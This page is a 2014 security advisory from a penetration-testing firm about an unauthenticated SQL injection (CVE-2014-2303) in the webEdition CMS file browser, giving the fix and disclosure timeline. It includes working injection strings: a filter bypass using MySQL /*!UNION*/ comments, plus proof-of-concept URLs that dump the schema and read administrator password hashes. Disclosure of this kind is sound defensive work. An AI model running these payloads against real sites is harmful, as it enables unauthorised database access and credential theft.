+49 241 510081-0kontakt@redteam-pentesting.de[Contact form](#contactform)JavaScript is not enabled in your browser. Please consider that some functions might not be available for you.![RedTeam Pentesting Header](/img/header/hl_header-1_hu0f2d230fb5185511a90e67c2e597c0b5_900546_1000x0_resize_q100_h2_box.webp)![RedTeam Pentesting Header](/img/header/hl_header-2_hub774373357e916cb041b4943299d8717_1132770_1000x0_resize_q100_h2_box.webp)![RedTeam Pentesting Header](/img/header/hl_header-3_hub8fc12cb70b2021e589c6810b4b53d04_895916_1000x0_resize_q100_h2_box.webp)![RedTeam Pentesting Header](/img/header/hl_header-4_hu27d71f64bf1f030161a23c2dcd666f59_1015002_1000x0_resize_q100_h2_box.webp)![RedTeam Pentesting Header](/img/header/hl_header-5_hud32f8d698ff23308f4d8b8566aae5928_933115_1000x0_resize_q100_h2_box.webp)![RedTeam Pentesting Header](/img/header/hl_header-6_hu1bc03534cd122894ef676fff89833ac5_1144618_1000x0_resize_q100_h2_box.webp)![RedTeam Pentesting Header](/img/header/hl_header-7_hu91e55bd77169043ae9e542f1b5f8f2f4_1354043_1000x0_resize_q100_h2_box.webp)![RedTeam Pentesting Header](/img/header/hl_header-8_hu155130647c165410f2ffa35227549138_1321813_1000x0_resize_q100_h2_box.webp)[newer](https://www.redteam-pentesting.de/en/advisories/rt-sa-2014-006/)[back to overview](/en/advisories)[older](https://www.redteam-pentesting.de/en/advisories/rt-sa-2014-004/)

[Text Version](/en/advisories/rt-sa-2014-005.txt)

## SQL Injection in webEdition CMS File Browser

RedTeam Pentesting discovered an SQL injection vulnerability in the file
browser component of webEdition CMS during a penetration test.
Unauthenticated attackers can get read-only access on the SQL database
used by webEdition and read for example password hashes used by
administrative accounts.

### Details

* Product: webEdition CMS
* Affected Versions: webEdition 6.3.8.0 svn6985 down to 6.3.3.0,
* probably earlier versions, too
* Fixed Versions: 6.2.7-s1 - 6.3.8-s1
* Vulnerability Type: SQL Injection
* Security Risk: high
* Vendor URL: `http://www.webedition.org`
* Vendor Status: fixed version released
* Advisory URL: `https://www.redteam-pentesting.de/advisories/rt-sa-2014-005`
* Advisory Status: published
* CVE: CVE-2014-2303
* CVE URL: `https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-2303`

### Introduction

“webEdition is a flexible CMS for companies of every size. It offers a
great amount of functionality and can be flexibly customized for
individual needs. It is ideally suited for users who want to operate
their web-site comfortably. Even the creation of custom web-applications
is easily possible with webEdition.”

(translated from webEdition homepage)

### More Details

The webEdition CMS contains a file browser component that allows
browsing parts of the website’s filesystem structure. It is usually
reachable under the following URL:

`http://www.example.com/webEdition/we_fs.php`

When browsing to individual directories, HTTP GET requests such as the
following are sent to the web server:

```
GET /webEdition/we_fs.php?what=4&table=tblFile&id=1&order=IsFolder%20
    DESC,%20Text&filter= HTTP/1.1
Host: www.example.com
[...]

```

The server responds with JavaScript code that updates the directory
listing:

```
<script>
top.clearEntries();
top.addEntry(13,"folder.gif","careers",1,"/en/careers");
top.addEntry(14,"folder.gif","company",1,"/en/company");
top.addEntry(15,"folder.gif","contact",1,"/en/contact");
top.addEntry(20,"we_dokument.gif","index.php",0,"/en/index.php");
top.writeBody(top.fsbody.document);
[...]
</script>

```

The requests which are sent to retrieve this information contain two
interesting parameters: “table” with a value of “tblFile” which appears
to name a database table, and the parameter “order” with a value of
“IsFolder DESC, Text”, which contains parts of an SQL ORDER BY clause.
In combination, these two parameters can be used to perform SQL
injection attacks. It appears that they are embedded into an SQL query
in a similar manner as follows:

```
SELECT ID,ParentID,Text,Path,IsFolder,Icon
       FROM tblFile
      WHERE [...]
   ORDER BY IsFolder DESC, Text

```

Using a `table` parameter value of `tblFile WHERE 1=1 /*` and an `order`
parameter value of `*/`, will result in a query similar to the
following:

```
SELECT ID,ParentID,Text,Path,IsFolder,Icon
       FROM tblFile WHERE 1=1 /*
      WHERE [...]
   ORDER BY */

```

The queries executed by the CMS retrieve six columns, which can be seen
in the application’s source code, or by injecting ORDER BY clauses with
numeric column indexes into the query. Knowing the number of columns in
a query, it is typically possible to use the UNION operator to obtain
additional information, for example from other tables. As a security
measure, webEdition implements filtering of the UNION keyword.

The web application checks whether the text “UNION” is part of
user-supplied information that is entered into database queries and then
blocks such queries. This behaviour is implemented in the file
`/webEdition/we/include/we_classes/database/we_database_base.class.php`
using the function
`preg_match('/[\s\(`"'\/)]union[\s(`\/]/i', $queryWithoutStrings)`.

The CMS first checks whether the text “UNION” appears in the query
string in any combination of upper- and lowercase characters. If that is
the case, a regular expression is used to determine whether the word
“UNION” appears in any context that is deemed dangerous by the
application developers. However, the underlying MySQL database system
supports embedding MySQL-specific query code within comments that
contain an exclamation mark ("!")
(see <https://dev.mysql.com/doc/refman/5.5/en/comments.html>).

For example, a query like

```
SELECT * FROM tblUsers WHERE 1=0 /*! OR 1=1 */

```

will yield no results on other database systems, but will return all
rows on MySQL. Likewise, the text `/*!UNION*/`, which is not caught by
the aforementioned regular expression, can be used instead of just
“UNION” on MySQL, thus enabling injections that use the UNION operator:

```
$ curl --silent 'http://www.example.com/webEdition/we_fs.php?what=4'\
'&table=tblFile+WHERE+1=0+/*!UNION*/+SELECT+1,2,3,4,5,6/*&order=*/'
<script>
top.clearEntries();
top.addEntry(1,"6","3",5,"4");
[...]

```
### Proof of Concept

The following URL lists the configured tables and their columns from the
webEdition database:

```
http://www.example.com/webEdition/we_fs.php?what=4&table=tblFile+WHERE+
    1=0+/*!UNION*/+SELECT+1,2,TABLE_NAME,4,COLUMN_NAME,TABLE_SCHEMA+
    FROM+INFORMATION_SCHEMA.COLUMNS/*&order=*/

```

The following URL retrieves configured users and hashed passwords from
the webEdition database:

```
http://www.example.com/webEdition/we_fs.php?what=4&table=tblFile+WHERE+
    1=0+/*!UNION*/+SELECT+1,2,passwd,4,5,username+FROM+tblUser/*&order=*/

```
### Workaround

Disable the file browser component of webEdition, for example by
deleting we\_fs.php.

### Fix

Update to a version with the suffix -s1. Those versions are available as
updates for releases between 6.2.7 and 6.3.8. The newest, updated
version would therefore be 6.3.8-s1.

Note that the version check of webEdition might tell you that there is
no update available and that you are running Version “6.3.8 (6.3.8.0
Release, SVN-Revision 6985). It will still tell you that the newest
available version is “6.3.8-s1 (6.3.8.0 Release, SVN-Revision 6985)”, so
you can use the “Update-Repetition” function to get the fix for this
vulnerability.

### Security Risk

Attackers can exploit this SQL injection vulnerability to read contents
of the webEdition database. This database contains, among published and
potentially unpublished content of the CMS, the credentials of the
administrative users of the CMS. If an attacker manages to find a
password for a password hash extracted using this SQL injection
vulnerability, the attacker could use these credentials to gain
administrative privileges in the CMS. This poses a high risk.

### Timeline

* 2014-02-20 Vulnerability identified
* 2014-03-04 Customer approved disclosure to vendor
* 2014-03-06 CVE number requested and assigned
* 2014-03-07 Vendor notified
* 2014-03-10 Vendor acknowledges vulnerability
* 2014-05-20 Vendor announces fixed versions
* 2014-05-28 Advisory released

### References

* [Wichtiges-Sicherheitsupdate-fuer-CMS-webEdition-veroeffentlicht (German)](https://www.webedition.org/de/aktuell/wichtiges-sicherheitsupdate-fuer-cms-webedition-veroeffentlicht)
* [Wichtige-Hinweise-zum-Sicherheitsupdate (German)](https://www.webedition.org/de/aktuell/wichtige-hinweise-zum-sicherheitsupdate)

### RedTeam Pentesting GmbH

RedTeam Pentesting offers individual penetration tests, short pentests,
performed by a team of specialised IT-security experts. Hereby, security
weaknesses in company networks or products are uncovered and can be
fixed immediately.

As there are only few experts in this field, RedTeam Pentesting wants to
share its knowledge and enhance the public knowledge with research in
security-related areas. The results are made available as public
security advisories.

More information about RedTeam Pentesting can be found at
<https://www.redteam-pentesting.de>.

# Contact us

We are happy to advise you and answer your questions.Contact dataPhone: +49 241 510081-0
Email: kontakt@redteam-pentesting.de
([GnuPG/PGP public key](/gpg/RedTeam-Pentesting-GPG-Kontakt-Key.asc))Visit and Postal AddressRedTeam Pentesting GmbH
Alter Posthof 1
52062 AachenEmployees of RedTeam Pentesting may be contacted directly at
firstname.lastname@redteam-pentesting.de:
([GnuPG/PGP public keys](/gpg/RedTeam-Pentesting-GPG-All-Keys.asc))Contact formâ![CAPTCHA]()
I agree to the transmission and processing of my data to RedTeam Pentesting according to RedTeam Pentesting’s [privacy policy](/en/imprint/privacy).
Company

* [About us](/en/redteam/)
* [History](/en/redteam/history/)
* [Press](/en/press/)
* [News Archive](/en/archive/)
Pentest

* [Definition](/en/pentest/)
* [Types of Tests](/en/pentest/types/)
* [Workflow](/en/pentest/workflow/)
* [FAQ](/en/faq/)
Publications

* [Overview](/en/publications/)
* [Advisories](/en/advisories/)
* [Talks](/en/talks/)
* [Other Publications](/en/publications-other/)
[Career](https://jobs.redteam-pentesting.de/)[Blog](https://blog.redteam-pentesting.de/)[Contact](#contactform)[Imprint](/en/imprint/) |
[Privacy Policy](/en/imprint/privacy/)

=== Content from packetstormsecurity.com_ce63c71e_20250125_145523.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)


